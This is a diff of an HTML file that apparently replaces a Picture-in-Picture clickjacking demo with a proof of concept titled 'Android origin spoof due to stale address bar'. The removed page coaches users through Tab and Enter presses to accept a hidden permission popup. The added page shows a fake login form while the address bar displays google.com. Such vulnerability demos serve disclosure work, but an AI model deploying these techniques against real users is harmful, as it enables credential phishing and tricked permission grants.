@@ -1,309 +1,135 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<!doctype html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple 2-Step PiP Game</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f0f0f0;
-      font-family: Arial, sans-serif;
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-
-    .step-heading {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .hidden {
-      display: none;
-    }
-  </style>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html { font-family: sans-serif; }
+body {
+    overscroll-behavior: contain;
+}
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+#canvasElem { display: none; }
+.hide {
+    display: none;
+}
+</style>
 </head>
-
 <body>
-  <center style="position: absolute; top: 300px;">
-    <h2>Site Verification Required</h2>
-  </center>
-  <button id="open-pip-button" onclick="openPip()">Verify</button>
+<div id="startContent">
+<h1>PoC: Android origin spoof due to stale address bar</h1>
+<p id="instructions">Tap to continue</p>
+</div>
+<div id="spoofContent" class="hide">
+<h1>Spoooo&#128123;oooof</h1>
+<p><b>(ooh, scary!)</b></p>
+<p><i>A wild login form has appeared!</i></p>
+<h2>You must login to continue</h2>
+<form action="/?form" method="get">
+    <input id="inputElem" name="email" placeholder="Email">
+    <br>
+    <input name="password" placeholder="Password" type="password">
+    <input type="submit">
+</form>
+<a href="/?forgotpassword">Forgot password?</a>
+</div>
+<canvas id="canvasElem"></canvas>
+<script>
+var spoofUrl = 'https://www.google.com/account/about/';
 
-  <script>
-    let pipWindow;
-    let popupWindow; // Reference to the permission popup
+var delayToWaitForScroll = 1500;
 
-    async function openPip() {
-      try {
-        pipWindow = await documentPictureInPicture.requestWindow({
-          width: 1000,
-          height: 1000,
-        });
+var newWin;
 
-        const style = pipWindow.document.createElement('style');
-        style.textContent = `
-          body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-          }
-          .step-heading, #message, #confirm-button, #exit-message, #start-button  {
-            font-size: 24px;
-            text-align: center;
-          }
-          #message, #confirm-button, #exit-message, #start-button  {
-            display: none;
-            font-weight: bold;
-            margin-top: 20px;
-          }
-          #confirm-button, #start-button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-          }
-        `;
-        pipWindow.document.head.appendChild(style);
+var pipWindow;
 
-        // Create and add elements to PiP window
-        createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
-        createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Step 1:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'message', 'Press Tab 3 times and then hit confirm for step 2', 'none');
-        createAndAppendElement(pipWindow, 'button', 'confirm-button', 'Confirm', 'none');
-        createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter twice to Exit and verify', 'none');
+var targetWidth = 1000;
+var targetHeight = 500;
 
-        // Add event listeners
-        addEventListeners(pipWindow);
+var drawCanvas = (text) => {
+    const ctx = canvasElem.getContext('2d');
+    canvasElem.width = targetWidth;
+    canvasElem.height = targetHeight;
 
-      } catch (error) {
-        console.error('Error opening PiP window:', error);
-      }
-    }
+    ctx.fillStyle = `#fff`;
+    ctx.fillRect(0, 0, targetWidth, targetHeight);
 
-    function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
-      const element = pipWindow.document.createElement(tagName);
-      element.id = id;
-      element.textContent = textContent;
-      element.style.display = display;
-      if (className) {
-        element.className = className;
-      }
-      pipWindow.document.body.appendChild(element);
-    }
-
-    function addEventListeners(pipWindow) {
-      // Start button click event
-      const startButton = pipWindow.document.getElementById('start-button');
-      startButton.addEventListener('click', () => {
-        popupWindow = window.open('permission.html', 'popupWindow', 'width=100,height=100,left=850,top=650');
-        startButton.style.display = 'none';
-        pipWindow.document.getElementById('step1-heading').style.display = 'block';
-        pipWindow.document.getElementById('message').style.display = 'block';
-        pipWindow.document.getElementById('confirm-button').style.display = 'block';
-      });
-
-      // Confirm button click event
-      const confirmButton = pipWindow.document.getElementById('confirm-button');
-      confirmButton.addEventListener('click', () => {
-        pipWindow.document.getElementById('step1-heading').style.display = 'none';
-        pipWindow.document.getElementById('message').style.display = 'none';
-        confirmButton.style.display = 'none';
-        pipWindow.document.getElementById('step2-heading').style.display = 'block';
-        pipWindow.document.getElementById('exit-message').style.display = 'block';
-      });
-
-      // Exit on Enter key press
-      pipWindow.addEventListener('keydown', (event) => {
-        if (event.key === 'Enter') {
-          pipWindow.close();
-          // Close the permission popup after few seconds
-          setTimeout(() => {
-            if (popupWindow) {
-              popupWindow.close();
-            }
-          }, 500);
+    ctx.fillStyle = '#000';
+    text = text;
+    var fontSize;
+    if (text.length == 1) {
+        // Single character
+        fontSize = 400;
+        ctx.font = fontSize+'px sans-serif';
+        ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
+    } else if (text.length > 1) {
+        var lines = text.split('\n');
+        if (lines.length === 2) {
+            fontSize = 150;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
+            ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
+        } else {
+            fontSize = 170;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
         }
-      });
     }
-  </script>
+  }
+
+var createVideo = (canvasElem) => {
+    const video = document.createElement('video');
+    video.muted = true;
+    video.srcObject = canvasElem.captureStream();
+    video.play();
+    return video;
+}
+
+var videoElem = createVideo(canvasElem);
+
+var showingPiP = false;
+videoElem.addEventListener('enterpictureinpicture', function(event) {
+    showingPiP = true;
+    instructions.innerText = 'Tap again to continue';
+});
+
+// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
+drawCanvas('');
+
+var replaceContents = () => {
+    startContent.classList.add('hide');
+    spoofContent.classList.remove('hide');
+}
+
+var ran = false;
+
+window.addEventListener('click', () => {
+    if (!showingPiP) {
+        videoElem.requestPictureInPicture();
+        return;
+    }
+    if (ran) {
+        return;
+    }
+    ran = true;
+    newWin = window.open(spoofUrl, 'ao_spoof_test');
+    drawCanvas('3');
+    setTimeout(() => {
+        drawCanvas('2');
+    }, 1000);
+    setTimeout(() => {
+        drawCanvas('1');
+    }, 2000);
+    setTimeout(() => {
+        drawCanvas('Scroll down\nslowly');
+        //drawCanvas('Scroll down\nto continue');
+        //drawCanvas('Scroll down');
+        replaceContents();
+        setTimeout(() => {
+            newWin.close();
+            document.exitPictureInPicture();
+        }, delayToWaitForScroll);
+    }, 3000);
+});
+</script>
 </body>
-
-</html><!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple 2-Step PiP Game</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f0f0f0;
-      font-family: Arial, sans-serif;
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-
-    .step-heading {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .hidden {
-      display: none;
-    }
-  </style>
-</head>
-
-<body>
-  <center style="position: absolute; top: 300px;">
-    <h2>Site Verification Required</h2>
-  </center>
-  <button id="open-pip-button" onclick="openPip()">Verify</button>
-
-  <script>
-    let pipWindow;
-    let popupWindow; // Reference to the permission popup
-
-    async function openPip() {
-      try {
-        pipWindow = await documentPictureInPicture.requestWindow({
-          width: 1000,
-          height: 1000,
-        });
-
-        const style = pipWindow.document.createElement('style');
-        style.textContent = `
-          body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-          }
-          .step-heading, #message, #confirm-button, #exit-message, #start-button  {
-            font-size: 24px;
-            text-align: center;
-          }
-          #message, #confirm-button, #exit-message, #start-button  {
-            display: none;
-            font-weight: bold;
-            margin-top: 20px;
-          }
-          #confirm-button, #start-button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-          }
-        `;
-        pipWindow.document.head.appendChild(style);
-
-        // Create and add elements to PiP window
-        createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
-        createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Step 1:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'message', 'Press Tab 3 times and then hit confirm for step 2', 'none');
-        createAndAppendElement(pipWindow, 'button', 'confirm-button', 'Confirm', 'none');
-        createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter twice to Exit and verify', 'none');
-
-        // Add event listeners
-        addEventListeners(pipWindow);
-
-      } catch (error) {
-        console.error('Error opening PiP window:', error);
-      }
-    }
-
-    function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
-      const element = pipWindow.document.createElement(tagName);
-      element.id = id;
-      element.textContent = textContent;
-      element.style.display = display;
-      if (className) {
-        element.className = className;
-      }
-      pipWindow.document.body.appendChild(element);
-    }
-
-    function addEventListeners(pipWindow) {
-      // Start button click event
-      const startButton = pipWindow.document.getElementById('start-button');
-      startButton.addEventListener('click', () => {
-        popupWindow = window.open('permission.html', 'popupWindow', 'width=100,height=100,left=850,top=650');
-        startButton.style.display = 'none';
-        pipWindow.document.getElementById('step1-heading').style.display = 'block';
-        pipWindow.document.getElementById('message').style.display = 'block';
-        pipWindow.document.getElementById('confirm-button').style.display = 'block';
-      });
-
-      // Confirm button click event
-      const confirmButton = pipWindow.document.getElementById('confirm-button');
-      confirmButton.addEventListener('click', () => {
-        pipWindow.document.getElementById('step1-heading').style.display = 'none';
-        pipWindow.document.getElementById('message').style.display = 'none';
-        confirmButton.style.display = 'none';
-        pipWindow.document.getElementById('step2-heading').style.display = 'block';
-        pipWindow.document.getElementById('exit-message').style.display = 'block';
-      });
-
-      // Exit on Enter key press
-      pipWindow.addEventListener('keydown', (event) => {
-        if (event.key === 'Enter') {
-          pipWindow.close();
-          // Close the permission popup after few seconds
-          setTimeout(() => {
-            if (popupWindow) {
-              popupWindow.close();
-            }
-          }, 500);
-        }
-      });
-    }
-  </script>
-</body>
-
 </html>
